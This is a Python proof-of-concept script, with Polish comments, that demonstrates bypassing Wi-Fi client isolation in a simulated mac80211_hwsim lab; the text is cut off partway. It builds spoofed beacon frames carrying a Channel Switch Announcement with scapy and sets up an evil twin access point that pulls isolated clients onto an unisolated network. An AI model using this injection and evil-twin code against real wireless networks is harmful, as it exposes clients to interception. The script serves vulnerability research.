#!/usr/bin/env python3
"""
demonstracja obejscia client isolation przez beacon csa na hwsim
beacony subtype 8 nie sa chronione przez pmf, dzialaja na kazdym hostapd
dwa klienty lacza sie do legalnego ap z ap_isolate=1, potem csa przerzuca je na evil twin bez izolacji
dowod: ping miedzy klientami blokowany na legalnym ap, dziala na evil twin
"""

import argparse
import os
import re
import signal
import shlex
import socket
import struct
import subprocess
import sys
import time
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import Optional

# stale
SSID = "CSA_Test_Lab"
PASSPHRASE = "LabTest123!"
LEGIT_CHANNEL = 6
EVIL_CHANNEL = 11
CLIENT_NET = "10.10.0"

# sciezki
HOSTAPD_26_BIN = "/opt/hostapd-2.6/bin/hostapd"
HOSTAPD_SYS_BIN = "/usr/sbin/hostapd"
WPAS_BIN = "/sbin/wpa_supplicant"
WMEDIUMD_BIN = "/usr/bin/wmediumd"
WMEDIUMD_SOCKET = "/var/run/wmediumd.sock"
WSERVER_ERRPROB_UPDATE_REQUEST_TYPE = 9
WSERVER_ERRPROB_UPDATE_RESPONSE_TYPE = 10
WUPDATE_SUCCESS = 0

RAPORT_DIR = Path(__file__).parent
TMP_DIR = Path("/tmp/direct_hwsim_csa")
TMP_DIR.mkdir(parents=True, exist_ok=True)
PCAP_DIR = RAPORT_DIR / "pcaps" / "csa_injection"
LOG_DIR = RAPORT_DIR / "logs"

IFACE_AP = None
IFACE_INJ = None
IFACE_CAPTURE = None
IFACE_EVIL = None
CLIENTS = []
HOSTAPD_PROCS = []
WPAS_PROCS = []
TCPDUMP_PROCS = []
WMEDIUMD_PID = None


@dataclass
class Client:
    name: str
    iface: str
    ns: str
    ip_addr: str
    mac_addr: Optional[str] = None
    wpa_conf: Optional[Path] = None
    wpas_proc: Optional[subprocess.Popen] = None


# pomoce
def ts():
    return datetime.now().strftime("%H:%M:%S")


def log(msg):
    """wypisuje linie z jawnym crlf zeby terminal nie schodkowal"""
    text = str(msg).replace("\r\n", "\n").replace("\r", "\n")
    for line in text.split("\n"):
        if line:
            sys.stdout.write(f"[{ts()}] {line}\r\n")
        else:
            sys.stdout.write("\r\n")
    sys.stdout.flush()


def run(cmd, shell=True, capture=True, timeout=30):
    """uruchamia komende, zwraca (stdout, stderr, returncode) lub popen gdy capture=false"""
    if capture:
        r = subprocess.run(
            cmd,
            shell=shell,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    return subprocess.Popen(
        cmd,
        shell=shell,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )


def sudo(cmd, capture=True, timeout=30):
    return run(f"sudo {cmd}", capture=capture, timeout=timeout)


def q(value):
    return shlex.quote(str(value))


def stop_process(proc, name, timeout=5):
    """zabija proces w tle bez zawieszania potokow demo"""
    if not proc or proc.poll() is not None:
        return
    log(f"Stopping {name}...")
    proc.terminate()
    try:
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait(timeout=timeout)


def cleanup():
    """zatrzymuje procesy, usuwa namespace, wyladowuje hwsim"""
    log("=== CLEANUP ===")

    for proc in TCPDUMP_PROCS:
        stop_process(proc, "tcpdump")
    for proc in WPAS_PROCS:
        stop_process(proc, "wpa_supplicant")
    for proc in HOSTAPD_PROCS:
        stop_process(proc, "hostapd")

    if WMEDIUMD_PID:
        try:
            os.kill(WMEDIUMD_PID, signal.SIGTERM)
            time.sleep(0.2)
        except (ProcessLookupError, TypeError):
            pass

    subprocess.run(["sudo", "pkill", "-x", "hostapd"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "pkill", "-f", "^/sbin/wpa_supplicant -i wlan"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "pkill", "-x", "wpa_supplicant"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "pkill", "-x", "wmediumd"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "pkill", "-x", "tcpdump"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    for client in CLIENTS:
        subprocess.run(["sudo", "ip", "netns", "delete", client.ns],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(1)
    subprocess.run(["sudo", "modprobe", "-r", "mac80211_hwsim"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    log("Cleanup done.")


# wykrywanie interfejsow
def load_hwsim(radios=6):
    """laduje mac80211_hwsim, zwraca liste interfejsow w kolejnosci kernela"""
    sudo("modprobe -r mac80211_hwsim 2>/dev/null || true")
    time.sleep(0.5)
    sudo(f"modprobe mac80211_hwsim radios={int(radios)}")
    time.sleep(1.5)

    out, _, _ = sudo("iw dev 2>&1")
    ifaces = []
    for line in out.split("\n"):
        line = line.strip()
        if line.startswith("Interface "):
            ifaces.append(line.split()[1])
    log(f"hwsim interfaces: {ifaces}")
    return ifaces


def discover_roles(ifaces, client_count=2):
    """przypisuje role: ap, klienty, injekcja, capture, evil twin"""
    global IFACE_AP, IFACE_INJ, IFACE_CAPTURE, IFACE_EVIL, CLIENTS

    min_without_capture = client_count + 3
    if len(ifaces) < min_without_capture:
        raise RuntimeError(
            f"Need at least {min_without_capture} hwsim radios for {client_count} clients, "
            f"got {len(ifaces)}. Use --radios {min_without_capture + 1}."
        )

    IFACE_AP = ifaces[0]
    client_ifaces = ifaces[1:1 + client_count]
    IFACE_INJ = ifaces[1 + client_count]

    if len(ifaces) >= client_count + 4:
        IFACE_CAPTURE = ifaces[2 + client_count]
        IFACE_EVIL = ifaces[3 + client_count]
    else:
        IFACE_CAPTURE = None
        IFACE_EVIL = ifaces[2 + client_count]

    CLIENTS = [
        Client(
            name=f"sta{i + 1}",
            iface=iface,
            ns=f"sta{i + 1}ns",
            ip_addr=f"{CLIENT_NET}.{11 + i}",
            mac_addr=get_iface_mac_root(iface),
        )
        for i, iface in enumerate(client_ifaces)
    ]

    log(f"AP interface:       {IFACE_AP}")
    for client in CLIENTS:
        log(f"{client.name} interface:     {client.iface} in {client.ns} ({client.ip_addr})")
    log(f"Injection interface: {IFACE_INJ}")
    log(f"Capture interface:   {IFACE_CAPTURE or 'shared/disabled'}")
    log(f"Evil Twin interface: {IFACE_EVIL}")

    return IFACE_AP, CLIENTS, IFACE_INJ, IFACE_CAPTURE, IFACE_EVIL


def get_phy_for_iface(iface):
    out, _, _ = sudo(f"iw dev {q(iface)} info 2>&1")
    m = re.search(r"wiphy\s+(\d+)", out)
    if not m:
        raise RuntimeError(f"Could not find wiphy for {iface}: {out[:200]}")
    return f"phy{m.group(1)}"


# network namespace
def setup_client_namespaces(clients):
    """przenosi kazde radio klienta do osobnego namespace dla ping testow"""
    for client in clients:
        sudo(f"ip netns delete {q(client.ns)} 2>/dev/null || true")
        sudo(f"ip netns add {q(client.ns)}")

        phy = get_phy_for_iface(client.iface)
        sudo(f"ip link set {q(client.iface)} down 2>/dev/null || true")
        log(f"Moving {client.iface} ({phy}) into namespace {client.ns}")
        sudo(f"iw phy {q(phy)} set netns name {q(client.ns)}")
        time.sleep(0.4)

        client_cmd(client, "ip link set lo up")
        client_cmd(client, f"ip link set {q(client.iface)} up")


def client_cmd(client, cmd, capture=True, timeout=30):
    return sudo(f"ip netns exec {q(client.ns)} {cmd}", capture=capture, timeout=timeout)


# wmediumd
def get_iface_mac_root(iface):
    out, _, _ = run(f"ip -c=never link show {q(iface)}")
    m = re.search(r"link/ether ([0-9a-f:]+)", out)
    return m.group(1) if m else "02:00:00:00:00:00"


def generate_wmediumd_config(ifaces, error_prob_model=False):
    ids_lines = []
    for iface in ifaces:
        mac = get_iface_mac_root(iface)
        ids_lines.append(f'\t\t"{mac}"')

    joined_ids = ",\n".join(ids_lines)
    model = ""
    if error_prob_model:
        model = """
 model :
 {
     type = "prob";
     default_prob = 0.0;
 };
"""

    config = f"""ifaces : {{
     ids = [
 {joined_ids}
     ];
 }};
 {model}
"""
    cfg_path = "/tmp/wmediumd.cfg"
    with open(cfg_path, "w") as f:
        f.write(config)
    log(f"wmediumd config written: {cfg_path}")
    return cfg_path


def start_wmediumd(ifaces, server=False, error_prob_model=False):
    global WMEDIUMD_PID

    out, _, _ = run("which wmediumd 2>/dev/null || echo NOT_FOUND")
    if "NOT_FOUND" in out:
        log("wmediumd not found; skipping channel separation")
        return False

    cfg_path = generate_wmediumd_config(ifaces, error_prob_model=error_prob_model)
    sudo("pkill -x wmediumd 2>/dev/null || true")
    sudo(f"rm -f {q(WMEDIUMD_SOCKET)} 2>/dev/null || true")
    time.sleep(0.5)

    args = ["sudo", WMEDIUMD_BIN, "-c", cfg_path, "-l", "6"]
    if server:
        args.append("-s")
    log(f"Starting wmediumd{' server' if server else ''}...")
    logfile = TMP_DIR / "wmediumd.log"
    proc = subprocess.Popen(
        args,
        stdout=open(str(logfile), "w"),
        stderr=subprocess.STDOUT,
    )
    WMEDIUMD_PID = proc.pid
    time.sleep(1)

    out, _, _ = run("pgrep wmediumd 2>/dev/null || echo NOT_RUNNING")
    if "NOT_RUNNING" in out:
        log("WARNING: wmediumd may not have started")
        if logfile.exists():
            log(logfile.read_text(errors="replace")[:2000])
        return False

    if server:
        deadline = time.monotonic() + 5
        while time.monotonic() < deadline:
            if os.path.exists(WMEDIUMD_SOCKET):
                break
            time.sleep(0.2)
        if not os.path.exists(WMEDIUMD_SOCKET):
            log(f"WARNING: wmediumd server socket not found: {WMEDIUMD_SOCKET}")
            if logfile.exists():
                log(logfile.read_text(errors="replace")[:2000])
            return False

    log(f"wmediumd running (PID={WMEDIUMD_PID}, server={'yes' if server else 'no'})")
    return True


def mac_to_bytes(mac):
    return bytes(int(part, 16) for part in mac.split(":"))


def errprob_to_fixed_point(errprob):
    errprob = max(0.0, min(float(errprob), 1.0))
    before = int(errprob)
    after = int((errprob - before) * (1 << 31))
    return ((before << 31) + after) & 0xffffffff


def wmediumd_errprob_update(from_mac, to_mac, errprob=1.0):
    """aktualizuje prawdopodobienstwo utraty lacza w wmediumd server przez gniazdo unix"""
    payload = struct.pack(
        "!B6s6sI",
        WSERVER_ERRPROB_UPDATE_REQUEST_TYPE,
        mac_to_bytes(from_mac),
        mac_to_bytes(to_mac),
        errprob_to_fixed_point(errprob),
    )
    with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as sock:
        sock.settimeout(5)
        sock.connect(WMEDIUMD_SOCKET)
        sock.sendall(payload)
        response_type = sock.recv(1)
        if response_type != bytes([WSERVER_ERRPROB_UPDATE_RESPONSE_TYPE]):
            got = response_type[0] if response_type else "none"
            raise RuntimeError(f"unexpected wmediumd response type: {got}")
        rest = sock.recv(18)
        if len(rest) != 18:
            raise RuntimeError(f"short wmediumd response: {len(rest)} bytes")
        _, _, _, _, update_result = struct.unpack("!B6s6sIB", rest)
        return update_result


def apply_wmediumd_loss_after_csa(ap_mac, clients):
    """modeluje separacje kanalow po csa przez odciecie laczy legalny ap <-> sta"""
    if not os.path.exists(WMEDIUMD_SOCKET):
        return False, f"socket missing: {WMEDIUMD_SOCKET}"

    updates = []
    try:
        for client in clients:
            if not client.mac_addr:
                return False, f"{client.name} missing MAC"
            for src, dst in [(ap_mac, client.mac_addr), (client.mac_addr, ap_mac)]:
                rc = wmediumd_errprob_update(src, dst, errprob=1.0)
                label = f"{src}->{dst}:rc={rc}"
                updates.append(label)
                if rc != WUPDATE_SUCCESS:
                    return False, "; ".join(updates)
    except Exception as exc:
        return False, f"{type(exc).__name__}: {exc}; updates={'; '.join(updates)}"

    return True, "; ".join(updates)


# hostapd
def hostapd_bin(hostapd_ver):
    bin_path = HOSTAPD_26_BIN if hostapd_ver == "2.6" else HOSTAPD_SYS_BIN
    if not os.path.exists(bin_path):
        log(f"WARNING: {bin_path} not found, trying system hostapd")
        bin_path = HOSTAPD_SYS_BIN
    if not os.path.exists(bin_path):
        raise RuntimeError("No hostapd binary found")
    return bin_path


def write_hostapd_conf(iface, channel, pmf=2, ap_isolate=None, ctrl_dir="/var/run/hostapd", name="hostapd.conf"):
    """generuje tymczasowy hostapd.conf dla legalnego ap lub evil twin"""
    isolate_line = "" if ap_isolate is None else f"ap_isolate={1 if ap_isolate else 0}\n"
    conf = f"""interface={iface}
driver=nl80211
ssid={SSID}
hw_mode=g
channel={channel}
wpa=2
wpa_passphrase={PASSPHRASE}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
ieee80211w={pmf}
{isolate_line}beacon_int=100
dtim_period=2
ctrl_interface={ctrl_dir}
ctrl_interface_group=0
logger_stdout=-1
logger_stdout_level=2
"""
    conf_path = TMP_DIR / name
    conf_path.write_text(conf)
    return conf_path


def start_hostapd(iface, channel, hostapd_ver="2.10", pmf=2, ap_isolate=None, name="hostapd", ctrl_dir="/var/run/hostapd"):
    conf_path = write_hostapd_conf(
        iface=iface,
        channel=channel,
        pmf=pmf,
        ap_isolate=ap_isolate,
        ctrl_dir=ctrl_dir,
        name=f"{name}.conf",
    )
    bin_path = hostapd_bin(hostapd_ver)
    logfile = TMP_DIR / f"{name}.log"

    isolate_desc = "default" if ap_isolate is None else str(int(bool(ap_isolate)))
    log(f"Starting {name} on {iface} (channel {channel}, PMF={pmf}, ap_isolate={isolate_desc})...")
    proc = subprocess.Popen(
        ["sudo", bin_path, str(conf_path)],
        stdout=open(str(logfile), "w"),
        stderr=subprocess.STDOUT,
    )
    HOSTAPD_PROCS.append(proc)
    time.sleep(3)

    out, _, _ = sudo(f"iw dev {q(iface)} info 2>&1")
    if "type AP" in out:
        log(f"{name} ENABLED on {iface}")
    else:
        log(f"WARNING: {name} may not be fully started")
        log(f"  iw info: {out[:200]}")

    return proc


# wpa_supplicant i stan STA
def write_wpa_conf(client, pmf=1):
    """generuje per-client wpa_supplicant.conf"""
    conf = f"""ctrl_interface=/var/run/wpa_supplicant
update_config=1
country=PL
network={{
    ssid=\"{SSID}\"
    psk=\"{PASSPHRASE}\"
    proto=RSN
    key_mgmt=WPA-PSK
    pairwise=CCMP
    group=CCMP
    ieee80211w={pmf}
}}
"""
    conf_path = TMP_DIR / f"wpa_supplicant_{client.name}.conf"
    conf_path.write_text(conf)
    client.wpa_conf = conf_path
    return conf_path


def start_wpa_supplicant(client, pmf=1):
    conf_path = write_wpa_conf(client, pmf)
    client_cmd(client, f"iw dev {q(client.iface)} disconnect 2>/dev/null || true")
    client_cmd(client, f"rm -f /var/run/wpa_supplicant/{q(client.iface)} 2>/dev/null || true")

    log(f"Starting wpa_supplicant for {client.name} on {client.iface} (STA PMF={pmf})...")
    logfile = TMP_DIR / f"wpa_supplicant_{client.name}.log"
    proc = subprocess.Popen(
        [
            "sudo", "ip", "netns", "exec", client.ns,
            WPAS_BIN, "-i", client.iface, "-c", str(conf_path), "-D", "nl80211",
        ],
        stdout=open(str(logfile), "w"),
        stderr=subprocess.STDOUT,
    )
    client.wpas_proc = proc
    WPAS_PROCS.append(proc)
    time.sleep(3)
    return proc


def parse_link(out):
    if "Connected to" not in out:
        return False, None, None
    bssid = None
    freq = None
    for line in out.split("\n"):
        line = line.strip()
        if line.startswith("Connected to"):
            parts = line.split()
            if len(parts) >= 3:
                bssid = parts[2]
        elif line.startswith("freq:"):
            parts = line.split()
            if len(parts) >= 2:
                freq = parts[1]
    return True, bssid, freq


def check_association(client, timeout=15, expected_bssid=None):
    """czeka na asocjacje, zwraca (associated, bssid, freq)"""
    label = f"{client.name}/{client.iface}"
    log(f"Waiting for association on {label} (max {timeout}s)...")
    deadline = time.time() + timeout
    expected = expected_bssid.lower() if expected_bssid else None

    while time.time() < deadline:
        out, _, _ = client_cmd(client, f"iw dev {q(client.iface)} link")
        associated, bssid, freq = parse_link(out)
        if associated and (expected is None or (bssid or "").lower() == expected):
            log(f"ASSOCIATED {client.name}: BSSID={bssid}, freq={freq}")
            return True, bssid, freq
        time.sleep(1)

    out, _, _ = client_cmd(client, f"iw dev {q(client.iface)} link")
    log(f"Association timeout for {client.name}. Status: {out[:240]}")
    return False, None, None


def check_all_associated(clients, timeout=30, expected_bssid=None):
    started = time.monotonic()
    results = {}
    for client in clients:
        remaining = max(3, int(timeout - (time.monotonic() - started)))
        associated, bssid, freq = check_association(client, timeout=remaining, expected_bssid=expected_bssid)
        results[client.name] = {"associated": associated, "bssid": bssid, "freq": freq}
    return all(r["associated"] for r in results.values()), results, time.monotonic() - started


def get_sta_channel(client):
    out, _, _ = client_cmd(client, f"iw dev {q(client.iface)} info")
    for line in out.split("\n"):
        if "channel" in line:
            try:
                return int(line.strip().split()[1])
            except (IndexError, ValueError):
                pass
    return None


def wait_for_clients_channel(clients, target_channel, timeout=15, poll_interval=1.0):
    started = time.monotonic()
    deadline = started + timeout
    channels = {client.name: None for client in clients}

    while time.monotonic() < deadline:
        for client in clients:
            channels[client.name] = get_sta_channel(client)
        elapsed = time.monotonic() - started
        status = ", ".join(f"{name}=ch{ch}" for name, ch in channels.items())
        log(f"  Poll: {status} after {elapsed:.1f}s")
        if all(ch == target_channel for ch in channels.values()):
            return True, channels, elapsed
        time.sleep(poll_interval)

    return False, channels, time.monotonic() - started


def assign_client_ips(clients):
    for client in clients:
        client_cmd(client, f"ip addr flush dev {q(client.iface)}")
        client_cmd(client, f"ip addr add {q(client.ip_addr + '/24')} dev {q(client.iface)}")
        client_cmd(client, f"ip link set {q(client.iface)} up")
        log(f"IP assigned: {client.name} {client.iface} -> {client.ip_addr}/24")


# przechwytywanie pakietow
def start_tcpdump(label, iface, pcap_tmp, monitor=False, bpf=None):
    if not iface:
        return None
    cmd = ["sudo", "tcpdump", "-i", iface, "-w", str(pcap_tmp), "-s", "0"]
    if monitor:
        cmd.append("-I")
    if bpf:
        cmd.extend(shlex.split(bpf))

    log(f"tcpdump[{label}] -> {pcap_tmp} on {iface}")
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    TCPDUMP_PROCS.append(proc)
    time.sleep(1)
    return proc


def stop_tcpdump(proc, label):
    stop_process(proc, f"tcpdump[{label}]")


def copy_pcap(pcap_tmp, pcap_final):
    pcap_final.parent.mkdir(parents=True, exist_ok=True)
    if pcap_tmp and os.path.exists(pcap_tmp) and os.path.getsize(pcap_tmp) > 24:
        subprocess.run(["sudo", "cp", str(pcap_tmp), str(pcap_final)], capture_output=True)
        subprocess.run(["sudo", "chmod", "a+r", str(pcap_final)], capture_output=True)
        size = os.path.getsize(pcap_tmp)
        log(f"PCAP saved: {pcap_final} ({size} bytes)")
        return str(pcap_final)
    log(f"PCAP empty/missing: {pcap_tmp}")
    return None


# dowod ping
def ping_client_to_client(src, dst, count=5, wait=2):
    cmd = f"ping -c {int(count)} -W {int(wait)} {q(dst.ip_addr)}"
    out, err, rc = client_cmd(src, cmd, timeout=count * wait + 10)
    combined = "\n".join(part for part in [out, err] if part)
    log(f"PING {src.name} -> {dst.name} ({dst.ip_addr}) rc={rc}")
    log(combined or "<no ping output>")

    received = 0
    m = re.search(r",\s*(\d+)\s+received", combined)
    if m:
        received = int(m.group(1))
    success = received > 0 and "100% packet loss" not in combined
    return success, combined


def run_ping_phase(label, src, dst, expect_success, capture_iface, ts_str, capture_enabled=True):
    log(f"\n=== {label} PING TEST: {src.name} -> {dst.name} ===")
    tmp = f"/tmp/{label.lower()}_{ts_str}.pcap"
    final = PCAP_DIR / f"{label.lower()}_{ts_str}.pcap"
    proc = None
    if capture_enabled:
        proc = start_tcpdump(label, capture_iface, tmp, monitor=False, bpf="arp or icmp")
    else:
        log(f"tcpdump[{label}] skipped because --capture-ping is disabled")
    success, output = ping_client_to_client(src, dst)
    pcap = None
    if proc:
        stop_tcpdump(proc, label)
        pcap = copy_pcap(tmp, final)

    if success == expect_success:
        marker = f"{label}_PASS"
        if expect_success:
            log(f"{marker}: ping succeeded as expected.")
        else:
            log(f"{marker}: ping blocked as expected by client isolation.")
        return True, success, output, pcap

    marker = f"{label}_FAIL"
    expected = "success" if expect_success else "block"
    observed = "success" if success else "block"
    log(f"{marker}: expected {expected}, observed {observed}.")
    return False, success, output, pcap


# csa injection
def setup_monitor_mode(iface, channel):
    sudo(f"ip link set {q(iface)} down")
    sudo(f"iw dev {q(iface)} set type monitor")
    sudo(f"ip link set {q(iface)} up")
    sudo(f"iw dev {q(iface)} set channel {int(channel)}")
    log(f"{iface} in monitor mode, channel {channel}")


def get_ap_mac(ap_iface):
    out, _, _ = run(f"ip -c=never link show {q(ap_iface)}")
    m = re.search(r"link/ether ([0-9a-f:]+)", out)
    return m.group(1) if m else "02:00:00:00:00:00"


def inject_beacon_csa(ap_mac, current_ch, evil_ch, iface, count=30, switch_count=1):
    """wysyla sfalszowane beacony z csa ie przez scapy na interfejsie monitor"""
    from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, conf, sendp
    conf.ifaces.reload()

    csa_body = bytes([0x01, evil_ch, switch_count])
    frame = RadioTap() / Dot11(
        type=0,
        subtype=8,
        addr1="ff:ff:ff:ff:ff:ff",
        addr2=ap_mac,
        addr3=ap_mac,
    ) / Dot11Beacon(timestamp=0, beacon_interval=0x0064, cap=0x0431) \
      / Dot11Elt(ID="SSID", info=SSID.encode()) \
      / Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24") \
      / Dot11Elt(ID="DSset", info=bytes([current_ch])) \
      / Dot11Elt(ID=37, info=csa_body)

    log(f"Injecting {count} Beacon CSA frames: ch{current_ch}->ch{evil_ch} "
        f"(switch_count={switch_count}) via {iface}")
    sendp(frame, iface=iface, count=count, inter=0.1, verbose=False)
    log(f"Injection complete: {count} frames sent")


# glowny przeplyw
def run_attempt(args, attempt_no, max_attempts):
    global HOSTAPD_PROCS, WPAS_PROCS, TCPDUMP_PROCS, WMEDIUMD_PID
    global IFACE_AP, IFACE_INJ, IFACE_CAPTURE, IFACE_EVIL, CLIENTS

    HOSTAPD_PROCS = []
    WPAS_PROCS = []
    TCPDUMP_PROCS = []
    WMEDIUMD_PID = None
    CLIENTS = []
    attempt_started = time.monotonic()
    ts_str = datetime.now().strftime("%Y%m%d_%H%M%S")
    artifacts = []
    wmediumd_mode = "off"
    wmediumd_update_result = "SKIPPED"
    fallback_disconnect_used = False

    log("=" * 58)
    log("  DIRECT HWSIM EVIL TWIN ISOLATION BYPASS DEMO")
    log(f"  attempt: {attempt_no}/{max_attempts}")
    log(f"  hostapd: {args.hostapd_ver}  AP PMF: {args.pmf}  STA PMF: {args.sta_pmf}")
    log(f"  clients: {args.clients}  radios: {args.radios}")
    log(f"  Channel: {LEGIT_CHANNEL} -> {args.evil_channel}")
    if args.wmediumd_loss_after_csa:
        log("  wmediumd: experimental loss-after-CSA")
    log("=" * 58)

    sudo("pkill hostapd 2>/dev/null || true")
    sudo("pkill wpa_supplicant 2>/dev/null || true")
    sudo("pkill tcpdump 2>/dev/null || true")
    sudo("rm -f /var/run/wpa_supplicant/* 2>/dev/null || true")
    sudo("rm -f /var/run/hostapd/* /var/run/hostapd_evil/* 2>/dev/null || true")
    time.sleep(0.5)

    ifaces = load_hwsim(radios=args.radios)
    discover_roles(ifaces, client_count=args.clients)

    for iface in [IFACE_AP, IFACE_INJ, IFACE_CAPTURE, IFACE_EVIL]:
        if iface:
            sudo(f"ip link set {q(iface)} up 2>/dev/null || true")

    if not args.no_wmediumd:
        wmediumd_mode = "loss-after-csa" if args.wmediumd_loss_after_csa else "basic"
        wmediumd_started = start_wmediumd(
            ifaces,
            server=args.wmediumd_loss_after_csa,
            error_prob_model=args.wmediumd_loss_after_csa,
        )
        if args.wmediumd_loss_after_csa and not wmediumd_started:
            wmediumd_update_result = "START_FAIL"
            cleanup()
            return save_and_return(
                args,
                "WMEDIUMD_START_FAIL",
                "SKIPPED",
                artifacts,
                0,
                0,
                None,
                attempt_started,
                1,
                wmediumd_mode=wmediumd_mode,
                wmediumd_update_result=wmediumd_update_result,
                fallback_disconnect_used=fallback_disconnect_used,
            )

    try:
        setup_client_namespaces(CLIENTS)

        start_hostapd(
            IFACE_AP,
            LEGIT_CHANNEL,
            args.hostapd_ver,
            pmf=args.pmf,
            ap_isolate=True,
            name="hostapd_legit",
            ctrl_dir="/var/run/hostapd",
        )

        for client in CLIENTS:
            start_wpa_supplicant(client, pmf=args.sta_pmf)

        associated, assoc_results, assoc_elapsed = check_all_associated(CLIENTS, timeout=40)
        if not associated:
            log("BASELINE_ASSOC_FAIL: not all clients associated with legitimate AP.")
            for name in ["hostapd_legit.log", *[f"wpa_supplicant_{c.name}.log" for c in CLIENTS]]:
                lp = TMP_DIR / name
                if lp.exists():
                    log(f"--- {name} ---")
                    log(lp.read_text(errors="replace")[:5000])
            return {"exit_code": 1, "result": "NO_ASSOC", "attempt_elapsed": time.monotonic() - attempt_started}

        assign_client_ips(CLIENTS)
        ap_mac = get_ap_mac(IFACE_AP)
        pre_channels = {client.name: get_sta_channel(client) for client in CLIENTS}

        log("\n=== PRE-ATTACK STATUS ===")
        log(f"  Legit AP MAC: {ap_mac}")
        for client in CLIENTS:
            status = assoc_results[client.name]
            log(f"  {client.name}: BSSID={status['bssid']} freq={status['freq']} channel={pre_channels[client.name]} ip={client.ip_addr}")
        log("BASELINE_ASSOC_PASS: both clients associated to isolated legitimate AP.")

        if args.demo_isolation:
            baseline_ok, _, _, baseline_pcap = run_ping_phase(
                "BASELINE_ISOLATION",
                CLIENTS[0],
                CLIENTS[1],
                expect_success=False,
                capture_iface=IFACE_AP,
                ts_str=ts_str,
                capture_enabled=args.capture_ping,
            )
            if baseline_pcap:
                artifacts.append(baseline_pcap)
            if not baseline_ok:
                result = "BASELINE_ISOLATION_FAIL"
                return_result = 1
                return save_and_return(args, result, "SKIPPED", artifacts, assoc_elapsed, 0, None, attempt_started, return_result)
        else:
            log("BASELINE_ISOLATION_SKIPPED: --demo-isolation disabled.")

        if not IFACE_EVIL:
            result = "NO_EVIL_IFACE"
            return save_and_return(args, result, "SKIPPED", artifacts, assoc_elapsed, 0, None, attempt_started, 1)

        sudo(f"ip link set {q(IFACE_EVIL)} up 2>/dev/null || true")
        log("\n=== EVIL TWIN SETUP ===")
        evil_proc = start_hostapd(
            IFACE_EVIL,
            args.evil_channel,
            args.hostapd_ver,
            pmf=args.evil_pmf,
            ap_isolate=False,
            name="hostapd_evil",
            ctrl_dir="/var/run/hostapd_evil",
        )
        evil_mac = get_ap_mac(IFACE_EVIL)
        log(f"Evil Twin MAC: {evil_mac}")

        setup_monitor_mode(IFACE_INJ, LEGIT_CHANNEL)
        if IFACE_CAPTURE:
            setup_monitor_mode(IFACE_CAPTURE, LEGIT_CHANNEL)
            csa_capture_iface = IFACE_CAPTURE
        else:
            csa_capture_iface = None
            log("CSA monitor PCAP disabled because no separate capture radio is available.")

        csa_tmp = f"/tmp/csa_reassoc_{args.hostapd_ver}_{ts_str}.pcap"
        csa_final = PCAP_DIR / f"csa_reassoc_{args.hostapd_ver}_{ts_str}.pcap"
        csa_proc = start_tcpdump("CSA_REASSOC", csa_capture_iface, csa_tmp, monitor=True, bpf="not port 22") if csa_capture_iface else None

        csa_started = time.monotonic()
        burst_count = 0
        switch_elapsed = None
        switched = False
        post_channels = pre_channels.copy()

        for burst_no in range(1, args.csa_bursts + 1):
            burst_count = burst_no
            log(f"  CSA burst {burst_no}/{args.csa_bursts}")
            inject_beacon_csa(
                ap_mac,
                LEGIT_CHANNEL,
                args.evil_channel,
                IFACE_INJ,
                count=args.beacon_count,
                switch_count=1,
            )
            log(f"Waiting up to {args.wait}s for both clients to switch channel...")
            switched, post_channels, poll_elapsed = wait_for_clients_channel(
                CLIENTS,
                args.evil_channel,
                timeout=args.wait,
                poll_interval=args.poll_interval,
            )
            if switched:
                switch_elapsed = time.monotonic() - csa_started
                log(f"CSA_SWITCH_PASS: both clients switched after {switch_elapsed:.1f}s "
                    f"(burst {burst_no}, poll {poll_elapsed:.1f}s)")
                break
            if burst_no < args.csa_bursts:
                log("No full channel switch yet; sending another CSA burst...")
                time.sleep(args.burst_gap)

        if IFACE_CAPTURE:
            sudo(f"iw dev {q(IFACE_CAPTURE)} set channel {int(args.evil_channel)} 2>/dev/null || true")

        if not switched:
            log(f"CSA_SWITCH_FAIL: channels after CSA: {post_channels}")
            stop_tcpdump(csa_proc, "CSA_REASSOC")
            csa_pcap = copy_pcap(csa_tmp, csa_final) if csa_proc else None
            if csa_pcap:
                artifacts.append(csa_pcap)
            result = "WMEDIUMD_INJECTION_BLOCKED" if args.wmediumd_loss_after_csa else "CSA_SWITCH_FAIL"
            if args.wmediumd_loss_after_csa:
                log("WMEDIUMD_INJECTION_BLOCKED: wmediumd is active and clients did not process Beacon CSA.")
            return save_and_return(
                args,
                result,
                "SKIPPED",
                artifacts,
                assoc_elapsed,
                burst_count,
                switch_elapsed,
                attempt_started,
                1,
                wmediumd_mode=wmediumd_mode,
                wmediumd_update_result=wmediumd_update_result,
                fallback_disconnect_used=fallback_disconnect_used,
            )

        if args.wmediumd_loss_after_csa:
            log("Experimental wmediumd-loss: cutting legit AP <-> STA links after CSA.")
            update_ok, update_detail = apply_wmediumd_loss_after_csa(ap_mac, CLIENTS)
            wmediumd_update_result = update_detail
            if update_ok:
                log(f"WMEDIUMD_LOSS_APPLIED: {update_detail}")
            else:
                log(f"WMEDIUMD_UPDATE_FAIL: {update_detail}")
                return save_and_return(
                    args,
                    "WMEDIUMD_UPDATE_FAIL",
                    "SKIPPED",
                    artifacts,
                    assoc_elapsed,
                    burst_count,
                    switch_elapsed,
                    attempt_started,
                    1,
                    wmediumd_mode=wmediumd_mode,
                    wmediumd_update_result=wmediumd_update_result,
